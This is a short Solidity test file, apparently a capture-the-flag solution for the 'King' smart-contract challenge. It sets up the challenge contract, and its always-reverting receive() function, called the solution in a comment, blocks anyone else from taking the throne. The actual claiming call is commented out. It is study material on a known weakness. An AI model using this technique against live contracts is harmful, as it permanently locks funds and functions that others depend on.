// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/9King.sol";
import "../contracts/utils/TestWithSetup.sol";

contract KingAttack is TestWithSetup{
    King private challengeContract;

    constructor(){
    }

    function deployChalContract () public payable {
        // challengeContract = new King{value: 1 ether}();
        challengeContract = new King{value: msg.value}();
    }

    function testAttack() public {
        vm.prank(owner);
        (bool success, ) = address(this).call{value: 1 ether}(abi.encodeWithSignature("deployChalContract()"));
        console2.log(challengeContract.prize());
        vm.prank(user);
        // Fails below because attack creation should be done by another contract
        // (bool successs, ) = address(challengeContract).call{value: 1.1 ether}("");
        // assertEq(challengeContract._king(), user);

    }

    // this is the solution to the challenge as any payment transaction to this contract will revert
    receive() external payable {
    require(false, "cannot claim my throne!");
}
}